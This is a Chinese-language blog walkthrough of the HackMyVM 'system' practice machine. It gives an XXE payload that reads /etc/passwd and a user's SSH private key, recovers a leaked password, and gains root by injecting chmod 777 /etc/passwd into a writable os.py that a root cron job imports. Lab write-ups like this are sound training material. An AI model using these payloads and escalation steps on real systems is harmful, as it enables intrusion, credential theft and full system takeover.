@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="hackmyvm-system下载地址https:&#x2F;&#x2F;hackmyvm.eu&#x2F;machines&#x2F;?t&#x3D;xxe 实验环境我们在VirtualBox中使用  我们在vmware中使用这些配置  这个时候我们在VirtualBox中导入靶机。在vmware中使用我们的kali kali的ip为192.168.56.4 靶机的IP为192.168.56.5 主机发现1arp-scan -l 首先使用arp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackmyvm-system">
+<meta property="og:url" content="https://dgxddd.github.io/2023/03/24/hackmyvm-system/">
+<meta property="og:site_name" content="jxdgx">
+<meta property="og:description" content="hackmyvm-system下载地址https:&#x2F;&#x2F;hackmyvm.eu&#x2F;machines&#x2F;?t&#x3D;xxe 实验环境我们在VirtualBox中使用  我们在vmware中使用这些配置  这个时候我们在VirtualBox中导入靶机。在vmware中使用我们的kali kali的ip为192.168.56.4 靶机的IP为192.168.56.5 主机发现1arp-scan -l 首先使用arp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231117230524844.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231117230711375.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231117231108226.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231117231157119.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120161256496.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120161616275.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120171012832.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120171320072.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120171657240.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120171844311.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120172023076.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120172440722.png">
+<meta property="og:image" content="c:/Users/%E6%9D%9C%E5%B9%BF%E6%97%AD/AppData/Roaming/Typora/typora-user-images/image-20231120191202526.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120191814514.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120191940177.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120192319118.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120192507031.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120192732942.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120193056298.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120193233465.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120195229412.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120202132351.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120202737273.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120203452571.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120234106472.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120234143897.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120234505344.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120235317240.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121101324551.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121112348811.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121112806122.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121113040737.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121113216789.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121113426408.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121113539680.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121113734075.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121113834166.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121113906334.png">
+<meta property="article:published_time" content="2023-03-24T12:55:02.000Z">
+<meta property="article:modified_time" content="2026-04-24T12:56:53.887Z">
+<meta property="article:author" content="jxdgx">
+<meta property="article:tag" content="xxe">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231117230524844.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+        
+      
+    
+    <!-- title -->
+    <title>hackmyvm-system | jxdgx</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr is-post-page">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025/03/21/java%E5%8F%8D%E5%B0%84/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/03/21/stardust/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2023/03/24/hackmyvm-system/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&text=hackmyvm-system"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&title=hackmyvm-system"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&is_video=false&description=hackmyvm-system"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hackmyvm-system&body=Check out this article: https://dgxddd.github.io/2023/03/24/hackmyvm-system/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&title=hackmyvm-system"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&title=hackmyvm-system"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&title=hackmyvm-system"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&title=hackmyvm-system"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&name=hackmyvm-system&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2023/03/24/hackmyvm-system/&t=hackmyvm-system"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hackmyvm-system"><span class="toc-number">1.</span> <span class="toc-text">hackmyvm-system</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.</span> <span class="toc-text">下载地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.</span> <span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">1.5.</span> <span class="toc-text">xxe漏洞发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.6.</span> <span class="toc-text">ssh连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.7.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        
+<div class="post-layout">
+  <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      
+    <h1 class="posttitle p-name" itemprop="name headline">
+        hackmyvm-system
+    </h1>
+
+
+
+      <div class="meta meta-post">
+        
+    <div class="postdate">
+      
+        <time datetime="2023-03-24T12:55:02.000Z" class="dt-published" itemprop="datePublished">2023-03-24</time>
+        
+      
+    </div>
+
+
+        
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/hackmyvm/">hackmyvm</a>
+    </div>
+
+
+        
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/xxe/" rel="tag">xxe</a>, <a class="p-category" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+    </div>
+
+
+      </div>
+    </header>
+    
+
+    <div class="content e-content" itemprop="articleBody">
+      <h1 id="hackmyvm-system"><a href="#hackmyvm-system" class="headerlink" title="hackmyvm-system"></a>hackmyvm-system</h1><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/?t=xxe">https://hackmyvm.eu/machines/?t=xxe</a></p>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>我们在VirtualBox中使用</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231117230524844.png" alt="image-20231117230524844"></p>
+<p>我们在vmware中使用这些配置</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231117230711375.png" alt="image-20231117230711375"></p>
+<p>这个时候我们在VirtualBox中导入靶机。在vmware中使用我们的kali</p>
+<p>kali的ip为192.168.56.4</p>
+<p>靶机的IP为192.168.56.5</p>
+<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l 首先使用arp协议来探测存活主机</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231117231108226.png" alt="image-20231117231108226"></p>
+<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn 192.168.56.5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231117231157119.png" alt="image-20231117231157119"></p>
+<p>我们使用Pn参数来查看开放的端口</p>
+<h2 id="xxe漏洞发现"><a href="#xxe漏洞发现" class="headerlink" title="xxe漏洞发现"></a>xxe漏洞发现</h2><p>这个时候我们访问一个80端口来进行一下扫描。这个时候我们发现了这个是一个登录框这个时候我们随便登录一下然后用burp抓一下包</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120161256496.png" alt="image-20231120161256496"></p>
+<p>这个时候我们发现这个是利用在请求体的XML引用了外部实体，结果发现程序启用了外部实体</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120161616275.png" alt="image-20231120161616275"></p>
+<p>这个时候我们发现了xxe漏洞这个xxe漏洞的原理是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XXE 外部实体注入漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，从而导致会加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起 Dos 攻击等危害。</span><br><span class="line">XXE 漏洞触发的点往往是可以上传 xml 文件的位置，没有对上传的 xml 文件进行过滤，导致可上传恶意 xml文件。</span><br></pre></td></tr></table></figure>
+
+<p>而在这里中xxe在解析的时候我们可以发这个时候解析了xxe，说明这个存在xxe漏洞</p>
+<p>我们可以使用file协议去读取一下文件来检验一下。我们从而来构建payload来实现一下</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;details&gt;&lt;email&gt;&amp;admin;&lt;/email&gt;&lt;password&gt;root&lt;/password&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120171012832.png" alt="image-20231120171012832"></p>
+<p>这个时候我们发现我们成功的读取到了&#x2F;etc&#x2F;passwd目录。并在这个目录中我们看到了2个可以登录的权限一个是david</p>
+<p>和一个root。</p>
+<p>这个时候我们可以看看能不能读取到密码文件&#x2F;etc&#x2F;shadow.如果能读取到我们就可以登录上去了</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120171320072.png" alt="image-20231120171320072"></p>
+<p>最后我们发现我们查看失败，这个时候我们看一下能不能读取到文件david的私钥文件如果能够读取到那么我们也是可以进行登录的</p>
+<p>这个时候我们可以读取路径&#x2F;home&#x2F;david&#x2F;.ssh&#x2F;id_rsa.这个路径是默认的</p>
+<p>这个时候我们发现我们成功读取到了私钥文件这个时候我们在kali上保存一下私钥来使用私钥进行登录</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120171657240.png" alt="image-20231120171657240"></p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120171844311.png" alt="image-20231120171844311"></p>
+<p>我们这个时候保存私钥到了kali上我们使用私钥进行登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa david@192.168.56.5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120172023076.png" alt="image-20231120172023076"></p>
+<p>这个时候我们发现还是登录不上去，是要密码的</p>
+<p>这个时候我们用dirsearch 来扫描一下这个有没有隐藏的目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.56.5 -i 200</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120172440722.png" alt="image-20231120172440722"></p>
+<p>最后扫描我们发现没有扫描到啥文件这个时候我们去查看一下有没有别的漏洞。这个时候我们还回到david用户下是有隐藏文件的</p>
+<p>我们使用burp来使用字典爆破一下</p>
+<p>首先我们在burp爆破需要的字节</p>
+<p><img src="C:/Users/%E6%9D%9C%E5%B9%BF%E6%97%AD/AppData/Roaming/Typora/typora-user-images/image-20231120191202526.png" alt="image-20231120191202526"></p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120191814514.png" alt="image-20231120191814514"></p>
+<p>最后我们爆破得到文件有四个成功的，我们刚刚查看了.ssh&#x2F;id_rsa。这个时候我们可以查看一下.viminfo文件</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120191940177.png" alt="image-20231120191940177"></p>
+<p>其中我们这个时候看一下.viminfo文件中返回了啥东西。其中我们在这个文件中发现了&#x2F;usr&#x2F;local&#x2F;etc&#x2F;mypass.txt</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120192319118.png" alt="image-20231120192319118"></p>
+<p>这个时候我们用file协议包含一下这个&#x2F;usr&#x2F;local&#x2F;etc&#x2F;mypass.txt文件得到了密码h4ck3rd4v!d</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120192507031.png" alt="image-20231120192507031"></p>
+<h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><p>我们发现了密码h4ck3rd4v!d这个时候我们进行ssh连接，这个是因为开放了22端口上面开放了ssh服务</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120192732942.png" alt="image-20231120192732942"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>我们成功的登录了进行这个时候我们去下载提权辅助脚本这个时候我将kali上面的提权脚本上传到靶机在kali上开启服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120193056298.png" alt="image-20231120193056298"></p>
+<p>这个时候我们在靶机的&#x2F;tmp目录下下载过来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.4:8080/linpeas.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120193233465.png" alt="image-20231120193233465"></p>
+<p>这个时候我们给与linpeas.sh可以执行的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure>
+
+<p>这个时候他给我们说这几个是有可能提权的</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120195229412.png" alt="image-20231120195229412"></p>
+<p>我们使用第2个CVE-2022-0847发现失败。不知道为啥</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120202132351.png" alt="image-20231120202132351"></p>
+<p>剩下的没有gcc环境也是失败</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120202737273.png" alt="image-20231120202737273"></p>
+<p>这个时候我们看一下有没有定时任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120203452571.png" alt="image-20231120203452571"></p>
+<p>没有这个东西，那我们就用脚本来看一下有没有定时任务，脚本下载地址<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>
+<p>我们在靶机上下载然后加可以执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.4:8080/pspy64</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120234106472.png" alt="image-20231120234106472"></p>
+<p>我们运行后发现这个脚本一分钟会运行一次我们查看一下这个文件</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120234143897.png" alt="image-20231120234143897"></p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120234505344.png" alt="image-20231120234505344"></p>
+<p>这段代码首先读取&#x2F;home&#x2F;david下的cmd.txt文件读取后再到&#x2F;tmp目录下写入suid.txt文件，将其写入新文件，检查新文件是否存在，然后尝试通过系统命令给 <code>/bin/bash</code> 添加 SetUID 权限，最后输出相关信息。</p>
+<p>我们在cmd.txt中写入信息，然后会在1分钟后写入&#x2F;tmp&#x2F;suid.txt并对&#x2F;bin&#x2F;bash加s权限。但是不知道为啥没有加上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;123&quot;&gt;/home/david/cmd.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231120235317240.png" alt="image-20231120235317240"></p>
+<p>这个时候我们在看刚刚的脚本发现了这个只从 <code>os</code> 中导入了 <code>system</code>，而在后面使用了os.system这个时候我们没有导入os所以会报错，这个时候我们找下他的os文件</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121101324551.png" alt="image-20231121101324551"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name os.py 2&gt;/dev/null</span><br><span class="line">ls -al /usr/lib/python3.9/os.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121112348811.png" alt="image-20231121112348811"></p>
+<p>这个文件当我们suid.py这个定时任务调用的时候我们的os.py会调用，这个时候我们就需要改os.py中的内容我们就可以来用root权限去执行。不使用suid.py这个是因为这个没有写的权限我们不去使用</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121112806122.png" alt="image-20231121112806122"></p>
+<p>当os.py这个文件可以写那我们就需要将&#x2F;etc&#x2F;passwd中设置成为我们可以写入那么我们就可以修改root的密码得到最终的结果</p>
+<p>首先我们看&#x2F;etc&#x2F;passwd中没有写的权限</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121113040737.png" alt="image-20231121113040737"></p>
+<p>我们在os.py中加入一下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&#x27;chmod 777 /etc/passwd&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121113216789.png" alt="image-20231121113216789"></p>
+<p>然后我们在&#x2F;home&#x2F;david下创建一个文件在一分钟后我们会在&#x2F;tmp下得到suid.txt并会将&#x2F;etc&#x2F;passwd的权限设置为777</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121113426408.png" alt="image-20231121113426408"></p>
+<p>这个时候我们发现&#x2F;etc&#x2F;passwd中权限设置为了777</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121113539680.png" alt="image-20231121113539680"></p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121113734075.png" alt="image-20231121113734075"></p>
+<p>这个时候root是由密码的我们删除x保存就没有密码了</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121113834166.png" alt="image-20231121113834166"></p>
+<p>这个时候我们su root就可以得到root权限了</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231121113906334.png" alt="image-20231121113906334"></p>
+<p>到此这个靶场就结束了</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶场主要就是前面xxe的运用，后面的提权主要就是定时任务的提权。这个地方会有好多的提权方法就写了这一种最简单的你可以使用f反弹shell,或者设置suid都是可以的</p>
+
+    </div>
+  </article>
+  
+    <aside class="post-sidebar-toc">
+      <div class="post-sidebar-toc-inner">
+        <div class="post-sidebar-toc-title">Contents</div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hackmyvm-system"><span class="toc-number">1.</span> <span class="toc-text">hackmyvm-system</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.</span> <span class="toc-text">下载地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.</span> <span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">1.5.</span> <span class="toc-text">xxe漏洞发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 